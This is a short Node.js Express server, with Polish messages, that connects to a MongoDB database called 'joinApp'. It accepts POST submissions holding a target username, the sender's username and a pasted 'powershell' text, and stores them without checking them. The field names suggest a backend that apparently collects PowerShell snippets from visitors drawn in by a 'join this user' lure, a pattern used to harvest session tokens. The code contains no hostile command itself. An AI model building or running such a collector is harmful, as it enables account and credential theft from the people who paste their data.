const express = require("express");
const { MongoClient } = require("mongodb");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "5mb" }));
app.use(express.static("public"));

const client = new MongoClient(process.env.MONGODB_URI);

async function start() {
    try {
        await client.connect();

        console.log("Połączono z MongoDB!");

        const db = client.db("joinApp");
        const submissions = db.collection("submissions");

        app.post("/api/submit", async (req, res) => {
            try {
                const {
                    targetUsername,
                    yourUsername,
                    powershell
                } = req.body;

                if (!targetUsername || !yourUsername || !powershell) {
                    return res.status(400).json({
                        error: "Wszystkie pola są wymagane."
                    });
                }

                const result = await submissions.insertOne({
                    targetUsername,
                    yourUsername,
                    powershell,
                    createdAt: new Date()
                });

                res.json({
                    success: true,
                    id: result.insertedId
                });

            } catch (error) {
                console.error(error);

                res.status(500).json({
                    error: "Nie udało się zapisać danych."
                });
            }
        });

        app.listen(PORT, () => {
            console.log(`Strona działa na porcie ${PORT}`);
        });

    } catch (error) {
        console.error("Błąd połączenia z MongoDB:", error);
    }
}

start();
